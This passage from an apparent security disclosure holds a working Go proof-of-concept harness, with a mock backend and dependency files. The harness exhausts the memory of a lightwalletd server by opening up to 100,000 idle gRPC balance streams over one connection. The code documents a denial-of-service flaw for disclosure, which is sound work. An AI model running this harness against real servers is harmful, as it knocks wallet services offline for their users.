printf 'IDLE_STREAM_RESULT target=%s commit=%s single_connection=true zero_messages=true handlers=22000 oom_256m=true cancel_control_100000_alive=true restart_recovers=true backend_balance_calls=0\n' \
	"$TARGET_LABEL" "$TARGET_COMMIT"
```

### `poc/harness/main.go`

```go
package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"os"
	"runtime"
	"time"

	"github.com/zcash/lightwalletd/walletrpc"
	"google.golang.org/grpc"
	"google.golang.org/grpc/connectivity"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
)

func main() {
	if len(os.Args) > 1 && os.Args[1] == "backend" {
		if err := runBackend(os.Args[2:]); err != nil {
			fatal(err)
		}
		return
	}

	var target string
	var count int
	var mode string
	var pause time.Duration
	var pauseBeforeOpen time.Duration
	var useTLS bool
	flag.StringVar(&target, "target", "127.0.0.1:19245", "lightwalletd address")
	flag.IntVar(&count, "count", 100000, "stream attempts")
	flag.StringVar(&mode, "mode", "hold", "hold or cancel")
	flag.DurationVar(&pause, "pause", 10*time.Second, "pause after attempts")
	flag.DurationVar(&pauseBeforeOpen, "pause-before-open", 0, "pause after the single connection reaches Ready")
	flag.BoolVar(&useTLS, "tls", false, "use TLS with certificate verification disabled for the isolated test")
	flag.Parse()

	transportCredentials := credentials.TransportCredentials(insecure.NewCredentials())
	if useTLS {
		transportCredentials = credentials.NewTLS(&tls.Config{InsecureSkipVerify: true}) // isolated self-signed test certificate
	}
	conn, err := grpc.NewClient(target, grpc.WithTransportCredentials(transportCredentials))
	if err != nil {
		fatal(err)
	}
	defer conn.Close()
	conn.Connect()
	readyCtx, readyCancel := context.WithTimeout(context.Background(), 10*time.Second)
	for conn.GetState() != connectivity.Ready {
		state := conn.GetState()
		if !conn.WaitForStateChange(readyCtx, state) {
			readyCancel()
			fatal(fmt.Errorf("connection did not reach Ready: %s", conn.GetState()))
		}
	}
	readyCancel()
	fmt.Printf("IDLE_STREAM_CONNECTIONS_READY count=1 pause=%s\n", pauseBeforeOpen)
	if pauseBeforeOpen > 0 {
		time.Sleep(pauseBeforeOpen)
	}

	client := walletrpc.NewCompactTxStreamerClient(conn)
	streams := make([]grpc.ClientStreamingClient[walletrpc.Address, walletrpc.Balance], 0, count)
	cancels := make([]context.CancelFunc, 0, count)
	start := time.Now()
	opened := 0
	for i := 0; i < count; i++ {
		ctx, cancel := context.WithCancel(context.Background())
		stream, err := client.GetTaddressBalanceStream(ctx)
		if err != nil {
			cancel()
			fmt.Printf("IDLE_STREAM_OPEN_ERROR index=%d opened=%d error=%q\n", i, opened, err)
			break
		}
		opened++
		if mode == "cancel" {
			cancel()
		} else {
			streams = append(streams, stream)
			cancels = append(cancels, cancel)
		}
		if opened%5000 == 0 {
			var stats runtime.MemStats
			runtime.ReadMemStats(&stats)
			fmt.Printf("IDLE_STREAM_PROGRESS opened=%d client_alloc=%d elapsed=%s\n", opened, stats.Alloc, time.Since(start))
		}
	}
	fmt.Printf("IDLE_STREAM_DONE mode=%s opened=%d held=%d state=%s elapsed=%s\n", mode, opened, len(streams), conn.GetState(), time.Since(start))
	time.Sleep(pause)
	for _, cancel := range cancels {
		cancel()
	}
	if mode == "cancel" {
		probeCtx, probeCancel := context.WithTimeout(context.Background(), 5*time.Second)
		_, probeErr := client.GetLatestBlock(probeCtx, &walletrpc.ChainSpec{})
		probeCancel()
		fmt.Printf("IDLE_STREAM_POST_CONTROL_PROBE success=%t error=%v\n", probeErr == nil, probeErr)
		if probeErr != nil {
			fatal(fmt.Errorf("post-control probe failed: %w", probeErr))
		}
	}
	runtime.KeepAlive(streams)
}

func fatal(err error) {
	fmt.Fprintln(os.Stderr, err)
	os.Exit(1)
}
```

### `poc/harness/backend.go`

```go
package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"sync"
	"time"
)

func runBackend(args []string) error {
	flags := flag.NewFlagSet("backend", flag.ContinueOnError)
	listen := flags.String("listen", "127.0.0.1:19244", "HTTP listen address")
	if err := flags.Parse(args); err != nil {
		return err
	}

	var mutex sync.Mutex
	counts := make(map[string]int64)
	mux := http.NewServeMux()
	mux.HandleFunc("/status", func(w http.ResponseWriter, _ *http.Request) {
		mutex.Lock()
		defer mutex.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(counts)
	})
	mux.HandleFunc("/", func(w http.ResponseWriter, request *http.Request) {
		body, err := io.ReadAll(request.Body)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		var rpcRequest struct {
			Method string `json:"method"`
		}
		method := "unknown"
		if err := json.Unmarshal(body, &rpcRequest); err == nil && rpcRequest.Method != "" {
			method = rpcRequest.Method
		}
		mutex.Lock()
		counts[method]++
		count := counts[method]
		mutex.Unlock()
		fmt.Printf("IDLE_STREAM_BACKEND_REQUEST method=%s count=%d body_bytes=%d\n", method, count, len(body))

		w.Header().Set("Content-Type", "application/json")
		switch method {
		case "getblockchaininfo":
			_, _ = io.WriteString(w, `{"result":{"chain":"main","upgrades":{"76b809bb":{"name":"Sapling","activationheight":419200,"status":"active"}},"blocks":3470878,"bestblockhash":"0000000000000000000000000000000000000000000000000000000000000000","consensus":{"nextblock":"c8e71055","chaintip":"c8e71055"},"estimatedheight":3470878},"error":null,"id":1}`)
		case "getinfo":
			_, _ = io.WriteString(w, `{"result":{"build":"v6.3.0","subversion":"/Zebra:6.3.0/"},"error":null,"id":1}`)
		default:
			_, _ = io.WriteString(w, `{"result":null,"error":null,"id":1}`)
		}
	})
	server := &http.Server{Addr: *listen, Handler: mux, ReadHeaderTimeout: 5 * time.Second}
	fmt.Printf("IDLE_STREAM_BACKEND_READY addr=%s\n", *listen)
	return server.ListenAndServe()
}
```

### `poc/harness/go.mod`

```go-mod
module lightwalletd-idle-stream-harness

go 1.25.0

require (
	github.com/zcash/lightwalletd v0.5.4
	google.golang.org/grpc v1.82.1
)

require (
	golang.org/x/net v0.55.0 // indirect
	golang.org/x/sys v0.45.0 // indirect
	golang.org/x/text v0.37.0 // indirect
	google.golang.org/genproto/googleapis/rpc v0.0.0-20260414002931-afd174a4e478 // indirect
	google.golang.org/protobuf v1.36.11 // indirect
)
```

### `poc/harness/go.sum`

```text
github.com/cespare/xxhash/v2 v2.3.0 h1:UL815xU9SqsFlibzuggzjXhog7bL6oX9BbNZnL2UFvs=
github.com/cespare/xxhash/v2 v2.3.0/go.mod h1:VGX0DQ3Q6kWi7AoAeZDth3/j3BFtOZR5XLFGgcrjCOs=
github.com/go-logr/logr v1.4.3 h1:CjnDlHq8ikf6E492q6eKboGOC0T8CDaOvkHCIg8idEI=
github.com/go-logr/logr v1.4.3/go.mod h1:9T104GzyrTigFIr8wt5mBrctHMim0Nb2HLGrmQ40KvY=
github.com/go-logr/stdr v1.2.2 h1:hSWxHoqTgW2S2qGc0LTAI563KZ5YKYRhT3MFKZMbjag=
github.com/go-logr/stdr v1.2.2/go.mod h1:mMo/vtBO5dYbehREoey6XUKy/eSumjCCveDpRre4VKE=
github.com/golang/protobuf v1.5.4 h1:i7eJL8qZTpSEXOPTxNKhASYpMn+8e5Q6AdndVa1dWek=
github.com/golang/protobuf v1.5.4/go.mod h1:lnTiLA8Wa4RWRcIUkrtSVa5nRhsEGBg48fD6rSs7xps=
github.com/google/go-cmp v0.7.0 h1:wk8382ETsv4JYUZwIsn6YpYiWiBsYLSJiTsyBybVuN8=
github.com/google/go-cmp v0.7.0/go.mod h1:pXiqmnSA92OHEEa9HXL2W4E7lf9JzCmGVUdgjX3N/iU=
github.com/google/uuid v1.6.0 h1:NIvaJDMOsjHA8n1jAhLSgzrAzy1Hgr+hNrb57e+94F0=
github.com/google/uuid v1.6.0/go.mod h1:TIyPZe4MgqvfeYDBFedMoGGpEw/LqOeaOT+nhxU+yHo=
github.com/zcash/lightwalletd v0.5.4 h1:WgGIvB15ptIy1odrp+iEDO5EyAKGZH0Zh34hnbe2VjM=
github.com/zcash/lightwalletd v0.5.4/go.mod h1:trR7aGrr75YaIFW4eV4BvUo3UnceZMLx8v0KBeFFbVI=
go.opentelemetry.io/auto/sdk v1.2.1 h1:jXsnJ4Lmnqd11kwkBV2LgLoFMZKizbCi5fNZ/ipaZ64=
go.opentelemetry.io/auto/sdk v1.2.1/go.mod h1:KRTj+aOaElaLi+wW1kO/DZRXwkF4C5xPbEe3ZiIhN7Y=
go.opentelemetry.io/otel v1.43.0 h1:mYIM03dnh5zfN7HautFE4ieIig9amkNANT+xcVxAj9I=
go.opentelemetry.io/otel v1.43.0/go.mod h1:JuG+u74mvjvcm8vj8pI5XiHy1zDeoCS2LB1spIq7Ay0=
go.opentelemetry.io/otel/metric v1.43.0 h1:d7638QeInOnuwOONPp4JAOGfbCEpYb+K6DVWvdxGzgM=
go.opentelemetry.io/otel/metric v1.43.0/go.mod h1:RDnPtIxvqlgO8GRW18W6Z/4P462ldprJtfxHxyKd2PY=
go.opentelemetry.io/otel/sdk v1.43.0 h1:pi5mE86i5rTeLXqoF/hhiBtUNcrAGHLKQdhg4h4V9Dg=
go.opentelemetry.io/otel/sdk v1.43.0/go.mod h1:P+IkVU3iWukmiit/Yf9AWvpyRDlUeBaRg6Y+C58QHzg=
go.opentelemetry.io/otel/sdk/metric v1.43.0 h1:S88dyqXjJkuBNLeMcVPRFXpRw2fuwdvfCGLEo89fDkw=
go.opentelemetry.io/otel/sdk/metric v1.43.0/go.mod h1:C/RJtwSEJ5hzTiUz5pXF1kILHStzb9zFlIEe85bhj6A=
go.opentelemetry.io/otel/trace v1.43.0 h1:BkNrHpup+4k4w+ZZ86CZoHHEkohws8AY+WTX09nk+3A=
go.opentelemetry.io/otel/trace v1.43.0/go.mod h1:/QJhyVBUUswCphDVxq+8mld+AvhXZLhe+8WVFxiFff0=
golang.org/x/net v0.55.0 h1:bcvxaJn3e1U6InsFWt1JUq1aSjnRxLzT2rtD2KfkDF8=
golang.org/x/net v0.55.0/go.mod h1:L5U2KuzuOe1lY7Z+aWVIKK6qEeJXnXV9yzGA+WCHJww=
golang.org/x/sys v0.45.0 h1:dO4czNzziLiiXplLQgBCEpCvXQ3dnkn0SdaZSYdQ+FY=
golang.org/x/sys v0.45.0/go.mod h1:4GL1E5IUh+htKOUEOaiffhrAeqysfVGipDYzABqnCmw=
golang.org/x/text v0.37.0 h1:Cqjiwd9eSg8e0QAkyCaQTNHFIIzWtidPahFWR83rTrc=
golang.org/x/text v0.37.0/go.mod h1:a5sjxXGs9hsn/AJVwuElvCAo9v8QYLzvavO5z2PiM38=
gonum.org/v1/gonum v0.17.0 h1:VbpOemQlsSMrYmn7T2OUvQ4dqxQXU+ouZFQsZOx50z4=
gonum.org/v1/gonum v0.17.0/go.mod h1:El3tOrEuMpv2UdMrbNlKEh9vd86bmQ6vqIcDwxEOc1E=
google.golang.org/genproto/googleapis/rpc v0.0.0-20260414002931-afd174a4e478 h1:RmoJA1ujG+/lRGNfUnOMfhCy5EipVMyvUE+KNbPbTlw=
google.golang.org/genproto/googleapis/rpc v0.0.0-20260414002931-afd174a4e478/go.mod h1:4Hqkh8ycfw05ld/3BWL7rJOSfebL2Q+DVDeRgYgxUU8=
google.golang.org/grpc v1.82.1 h1:NnAxzGRA0677vCa4BUkOAnO5+FfQqVl9iUXeD0IqcGE=
google.golang.org/grpc v1.82.1/go.mod h1:yzTZ1TB1Z3SG+LIYaI+WiE8D5+PZ3ArnrSp8zF3+/ZA=
google.golang.org/protobuf v1.36.11 h1:fV6ZwhNocDyBLK0dj+fg8ektcVegBBuEolpbTQyBNVE=
google.golang.org/protobuf v1.36.11/go.mod h1:HTf+CrKn2C3g5S8VImy6tdcUvCska2kB7j23XfzDpco=
```


---

[Rahul Saxena](https://x.com/saxenism)  
Founder, [Bluethroat Labs](https://bluethroatlabs.com)
